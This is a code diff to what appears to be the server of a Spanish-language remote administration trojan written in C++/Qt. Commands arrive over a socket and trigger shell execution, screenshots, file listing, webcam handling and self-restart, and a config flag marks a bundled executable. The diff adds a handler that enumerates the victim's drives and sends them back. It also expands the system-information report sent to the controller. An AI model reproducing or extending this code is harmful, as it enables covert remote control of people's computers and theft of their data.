@@ -120,8 +120,9 @@ bool MainWindow::cargarConfiguracion(){
         this->tiempoConexion = conversion.toInt();
         this->alias = campo[7];
         this->nombreCopiable = campo[10];
-        if (campo[8] == "unido")
+        if (campo[8] == "unido") //Cuando hay un ejecutable adjunto
         {
+            //Esto está muy poco optimizado, mejorar más adelante.
             QDir directorio;
             QByteArray datos;
             datos = "|@|" + campo[1].toLatin1() + "|@|";
@@ -197,6 +198,10 @@ void MainWindow::llegadaDatos() {
     }
     if (parametros[0] == "home"){
         util.escribirSocket("home|@|" + QDir::homePath(),&socket);
+    }
+    if (parametros[0] == "unidades")
+    {
+        listarUnidades();
     }
     if (parametros[0] == "archivos"){
         listarArchivos(parametros[1]);
@@ -279,10 +284,6 @@ void MainWindow::llegadaDatos() {
             directorio.remove("./log");
         }
     }
-    if (parametros[0] == "alias")
-    {
-        util.escribirSocket("alias|@|" + this->alias,&socket);
-    }
     if (parametros[0] == "informacion")
     {
         QString so;
@@ -294,11 +295,11 @@ void MainWindow::llegadaDatos() {
         alto.setNum(QApplication::desktop()->height());
         QString ancho;
         ancho.setNum(QApplication::desktop()->width());
-        QString resolucion = ancho + "X" + alto;
         QDate tiempo;
         QString fecha = tiempo.currentDate().toString();
         QTime horaSistema;
         QString hora = horaSistema.currentTime().toString();
+        QString alias = this->alias;
         #ifdef Q_WS_WIN
             so = "Windows";
             switch (QSysInfo::WindowsVersion)
@@ -323,7 +324,7 @@ void MainWindow::llegadaDatos() {
                 break;
             }
 
-            util.escribirSocket("informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + resolucion + "|@|" + fecha + "|@|" + hora + "|@|",&socket);
+            util.escribirSocket("informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + ancho + "|@|" + alto + "|@|" + fecha + "|@|" + hora + "|@|" + alias + "|@|",&socket);
         #endif
 
     }
@@ -417,7 +418,7 @@ QPixmap MainWindow::screenShot(){
 void MainWindow::desconectado() {
     /** cosas que hacer al desconectarse **/
     temporizador.start(this->tiempoConexion);
-
+    apagar(); //Si se desconecta y la webcam estaba encendida es mejor apagarla.
 }
 
 QString MainWindow::shell(QString comando){
@@ -429,12 +430,19 @@ QString MainWindow::shell(QString comando){
 
 void MainWindow::reiniciar(){
     /** Función que reinicia el servidor **/
-    QProcess consola;
     QString filePath = QApplication::applicationFilePath();
-    consola.execute(filePath);
+    QProcess::startDetached(filePath);
     QApplication::exit();
 }
-
+void MainWindow::listarUnidades()
+{   int i;
+    QString unidades = "unidades|@|";
+    QFileInfoList listaUnidades = directorio.drives();
+    for (i=0;i<listaUnidades.size();i++){
+        unidades = unidades + listaUnidades[i].absoluteFilePath() + "|@|";
+    }
+    util.escribirSocket(unidades,&socket);
+}
 void MainWindow::listarArchivos(QString ruta){
     /** Función que envia por socket una lista de archivos del directorio pasado como parámetro **/
     int i;
